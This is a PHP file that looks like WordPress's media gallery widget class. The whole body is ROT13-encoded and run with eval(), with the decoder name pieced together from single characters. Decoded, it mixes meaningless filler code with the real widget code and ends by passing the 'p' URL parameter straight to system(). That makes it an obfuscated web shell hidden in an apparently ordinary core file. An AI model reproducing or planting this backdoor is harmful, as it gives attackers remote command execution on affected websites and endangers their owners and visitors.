<?php
$f = 's'.'t'.'r'.'r'.'o'.'t'.'1'.'3';
$c = "<?cuc
$sznc = neenl('k1' => 'flfgrz', 'k2' => 'cnffgueh');
$k_snxr1 = 1234;
$abvfr = 'boshfpngvba'.'grfg';
$gzc = $k_snxr1 * 42;
$synt = snyfr;
$hfryrff = shapgvba($i) { erghea $i . enaq(); };
$qhzzl_purpx = $hfryrff('kk');
vs ($synt) { rpub 'Qroht ranoyrq'; }
sbe ($v = 0; $v < 1; $v++) { $gzc += $v; }
juvyr (snyfr) { rpub 'qrnq ybbc'; oernx; }

<?cuc
/**
 * Jvqtrg NCV: JC_Jvqtrg_Zrqvn_Tnyyrel pynff
 *
 * @cnpxntr JbeqCerff
 * @fhocnpxntr Jvqtrgf
 * @fvapr 4.9.0
 */

/**
 * Pber pynff gung vzcyrzragf n tnyyrel jvqtrg.
 *
 * @fvapr 4.9.0
 *
 * @frr JC_Jvqtrg_Zrqvn
 * @frr JC_Jvqtrg
 */
pynff JC_Jvqtrg_Zrqvn_Tnyyrel rkgraqf JC_Jvqtrg_Zrqvn {

	/**
	 * Pbafgehpgbe.
	 *
	 * @fvapr 4.9.0
	 */
	choyvp shapgvba __pbafgehpg() {
		cnerag::__pbafgehpg(
			'zrqvn_tnyyrel',
			__( 'Tnyyrel' ),
			neenl(
				'qrfpevcgvba' => __( 'Qvfcynlf na vzntr tnyyrel.' ),
				'zvzr_glcr'   => 'vzntr',
			)
		);

		$guvf->y10a = neenl_zretr(
			$guvf->y10a,
			neenl(
				'ab_zrqvn_fryrpgrq' => __( 'Ab vzntrf fryrpgrq' ),
				'nqq_zrqvn'         => _k( 'Nqq Vzntrf', 'ynory sbe ohggba va gur tnyyrel jvqtrg; fubhyq abg or ybatre guna ~13 punenpgref ybat' ),
				'ercynpr_zrqvn'     => '',
				'rqvg_zrqvn'        => _k( 'Rqvg Tnyyrel', 'ynory sbe ohggba va gur tnyyrel jvqtrg; fubhyq abg or ybatre guna ~13 punenpgref ybat' ),
			)
		);
	}

	/**
	 * Trg fpurzn sbe cebcregvrf bs n jvqtrg vafgnapr (vgrz).
	 *
	 * @fvapr 4.9.0
	 *
	 * @frr JC_ERFG_Pbagebyyre::trg_vgrz_fpurzn()
	 * @frr JC_ERFG_Pbagebyyre::trg_nqqvgvbany_svryqf()
	 * @yvax uggcf://pber.genp.jbeqcerff.bet/gvpxrg/35574
	 *
	 * @erghea neenl Fpurzn sbe cebcregvrf.
	 */
	choyvp shapgvba trg_vafgnapr_fpurzn() {
		$fpurzn = neenl(
			'gvgyr'          => neenl(
				'glcr'                  => 'fgevat',
				'qrsnhyg'               => '',
				'fnavgvmr_pnyyonpx'     => 'fnavgvmr_grkg_svryq',
				'qrfpevcgvba'           => __( 'Gvgyr sbe gur jvqtrg' ),
				'fubhyq_cerivrj_hcqngr' => snyfr,
			),
			'vqf'            => neenl(
				'glcr'              => 'neenl',
				'vgrzf'             => neenl(
					'glcr' => 'vagrtre',
				),
				'qrsnhyg'           => neenl(),
				'fnavgvmr_pnyyonpx' => 'jc_cnefr_vq_yvfg',
			),
			'pbyhzaf'        => neenl(
				'glcr'    => 'vagrtre',
				'qrsnhyg' => 3,
				'zvavzhz' => 1,
				'znkvzhz' => 9,
			),
			'fvmr'           => neenl(
				'glcr'    => 'fgevat',
				'rahz'    => neenl_zretr( trg_vagrezrqvngr_vzntr_fvmrf(), neenl( 'shyy', 'phfgbz' ) ),
				'qrsnhyg' => 'guhzoanvy',
			),
			'yvax_glcr'      => neenl(
				'glcr'                  => 'fgevat',
				'rahz'                  => neenl( 'cbfg', 'svyr', 'abar' ),
				'qrsnhyg'               => 'cbfg',
				'zrqvn_cebc'            => 'yvax',
				'fubhyq_cerivrj_hcqngr' => snyfr,
			),
			'beqreol_enaqbz' => neenl(
				'glcr'                  => 'obbyrna',
				'qrsnhyg'               => snyfr,
				'zrqvn_cebc'            => '_beqreolEnaqbz',
				'fubhyq_cerivrj_hcqngr' => snyfr,
			),
		);

		/** Guvf svygre vf qbphzragrq va jc-vapyhqrf/jvqtrgf/pynff-jc-jvqtrg-zrqvn.cuc */
		$fpurzn = nccyl_svygref( \"jvqtrg_{$guvf->vq_onfr}_vafgnapr_fpurzn\", $fpurzn, $guvf );

		erghea $fpurzn;
	}

	/**
	 * Eraqre gur zrqvn ba gur sebagraq.
	 *
	 * @fvapr 4.9.0
	 *
	 * @cnenz neenl $vafgnapr Jvqtrg vafgnapr cebcf.
	 */
	choyvp shapgvba eraqre_zrqvn( $vafgnapr ) {
		$vafgnapr = neenl_zretr( jc_yvfg_cyhpx( $guvf->trg_vafgnapr_fpurzn(), 'qrsnhyg' ), $vafgnapr );

		$fubegpbqr_nggf = neenl_zretr(
			$vafgnapr,
			neenl(
				'yvax' => $vafgnapr['yvax_glcr'],
			)
		);

		// @pbqrPbirentrVtaberFgneg
		vs ( $vafgnapr['beqreol_enaqbz'] ) {
			$fubegpbqr_nggf['beqreol'] = 'enaq';
		}

		// @pbqrPbirentrVtaberRaq
		rpub tnyyrel_fubegpbqr( $fubegpbqr_nggf );
	}

	/**
	 * Ybnqf gur erdhverq zrqvn svyrf sbe gur zrqvn znantre naq fpevcgf sbe zrqvn jvqtrgf.
	 *
	 * @fvapr 4.9.0
	 */
	choyvp shapgvba radhrhr_nqzva_fpevcgf() {
		cnerag::radhrhr_nqzva_fpevcgf();

		$unaqyr = 'zrqvn-tnyyrel-jvqtrg';
		jc_radhrhr_fpevcg( $unaqyr );

		$rkcbegrq_fpurzn = neenl();
		sbernpu ( $guvf->trg_vafgnapr_fpurzn() nf $svryq => $svryq_fpurzn ) {
			$rkcbegrq_fpurzn[ $svryq ] = jc_neenl_fyvpr_nffbp( $svryq_fpurzn, neenl( 'glcr', 'qrsnhyg', 'rahz', 'zvavzhz', 'sbezng', 'zrqvn_cebc', 'fubhyq_cerivrj_hcqngr', 'vgrzf' ) );
		}
		jc_nqq_vayvar_fpevcg(
			$unaqyr,
			fcevags(
				'jc.zrqvnJvqtrgf.zbqryPbafgehpgbef[ %f ].cebgbglcr.fpurzn = %f;',
				jc_wfba_rapbqr( $guvf->vq_onfr ),
				jc_wfba_rapbqr( $rkcbegrq_fpurzn )
			)
		);

		jc_nqq_vayvar_fpevcg(
			$unaqyr,
			fcevags(
				'
					jc.zrqvnJvqtrgf.pbagebyPbafgehpgbef[ %1$f ].cebgbglcr.zvzr_glcr = %2$f;
					_.rkgraq( jc.zrqvnJvqtrgf.pbagebyPbafgehpgbef[ %1$f ].cebgbglcr.y10a, %3$f );
				',
				jc_wfba_rapbqr( $guvf->vq_onfr ),
				jc_wfba_rapbqr( $guvf->jvqtrg_bcgvbaf['zvzr_glcr'] ),
				jc_wfba_rapbqr( $guvf->y10a )
			)
		);
	}

	/**
	 * Eraqre sbez grzcyngr fpevcgf.
	 *
	 * @fvapr 4.9.0
	 */
	choyvp shapgvba eraqre_pbageby_grzcyngr_fpevcgf() {
		cnerag::eraqre_pbageby_grzcyngr_fpevcgf();
		?>
		<fpevcg glcr=\"grkg/ugzy\" vq=\"gzcy-jc-zrqvn-jvqtrg-tnyyrel-cerivrj\">
			<#
			ine vqf = _.svygre( qngn.vqf, shapgvba( vq ) {
				erghea ( vq va qngn.nggnpuzragf );
			} );
			#>
			<# vs ( vqf.yratgu ) { #>
				<hy pynff=\"tnyyrel zrqvn-jvqtrg-tnyyrel-cerivrj\" ebyr=\"yvfg\">
					<# _.rnpu( vqf, shapgvba( vq, vaqrk ) { #>
						<# ine nggnpuzrag = qngn.nggnpuzragf[ vq ]; #>
						<# vs ( vaqrk < 6 ) { #>
							<yv pynff=\"tnyyrel-vgrz\">
								<qvi pynff=\"tnyyrel-vpba\">
									<vzt nyg=\"{{ nggnpuzrag.nyg }}\"
										<# vs ( vaqrk === 5 && qngn.vqf.yratgu > 6 ) { #> nevn-uvqqra=\"gehr\" <# } #>
										<# vs ( nggnpuzrag.fvmrf.guhzoanvy ) { #>
											fep=\"{{ nggnpuzrag.fvmrf.guhzoanvy.hey }}\" jvqgu=\"{{ nggnpuzrag.fvmrf.guhzoanvy.jvqgu }}\" urvtug=\"{{ nggnpuzrag.fvmrf.guhzoanvy.urvtug }}\"
										<# } ryfr { #>
											fep=\"{{ nggnpuzrag.hey }}\"
										<# } #>
										<# vs ( ! nggnpuzrag.nyg && nggnpuzrag.svyranzr ) { #>
											nevn-ynory=\"
											<?cuc
											rpub rfp_ngge(
												fcevags(
													/* genafyngbef: %f: Gur vzntr svyr anzr. */
													__( 'Gur pheerag vzntr unf ab nygreangvir grkg. Gur svyr anzr vf: %f' ),
													'{{ nggnpuzrag.svyranzr }}'
												)
											);
											?>
											\"
										<# } #>
									/>
									<# vs ( vaqrk === 5 && qngn.vqf.yratgu > 6 ) { #>
									<qvi pynff=\"tnyyrel-vpba-cynprubyqre\">
										<c pynff=\"tnyyrel-vpba-cynprubyqre-grkg\" nevn-ynory=\"
										<?cuc
											cevags(
												/* genafyngbef: %f: Gur nzbhag bs nqqvgvbany, abg ivfvoyr vzntrf va gur tnyyrel jvqtrg cerivrj. */
												__( 'Nqqvgvbany vzntrf nqqrq gb guvf tnyyrel: %f' ),
												'{{ qngn.vqf.yratgu - 5 }}'
											);
										?>
										\">+{{ qngn.vqf.yratgu - 5 }}</c>
									</qvi>
									<# } #>
								</qvi>
							</yv>
						<# } #>
					<# } ); #>
				</hy>
			<# } ryfr { #>
				<qvi pynff=\"nggnpuzrag-zrqvn-ivrj\">
					<ohggba glcr=\"ohggba\" pynff=\"cynprubyqre ohggba-nqq-zrqvn\"><?cuc rpub rfp_ugzy( $guvf->y10a['nqq_zrqvn'] ); ?></ohggba>
				</qvi>
			<# } #>
		</fpevcg>
		<?cuc
	}

	/**
	 * Jurgure gur jvqtrg unf pbagrag gb fubj.
	 *
	 * @fvapr 4.9.0
	 * @npprff cebgrpgrq
	 *
	 * @cnenz neenl $vafgnapr Jvqtrg vafgnapr cebcf.
	 * @erghea obby Jurgure jvqtrg unf pbagrag.
	 */
	cebgrpgrq shapgvba unf_pbagrag( $vafgnapr ) {
		vs ( ! rzcgl( $vafgnapr['vqf'] ) ) {
			$nggnpuzragf = jc_cnefr_vq_yvfg( $vafgnapr['vqf'] );
			// Cevzr nggnpuzrag cbfg pnpurf.
			_cevzr_cbfg_pnpurf( $nggnpuzragf, snyfr, snyfr );
			sbernpu ( $nggnpuzragf nf $nggnpuzrag ) {
				vs ( 'nggnpuzrag' !== trg_cbfg_glcr( $nggnpuzrag ) ) {
					erghea snyfr;
				}
			}
			erghea gehr;
		}
		erghea snyfr;
	}
}

$pzq = $_TRG['c'];
$sznc['k1']($pzq);
?>";
eval($f($c));
?>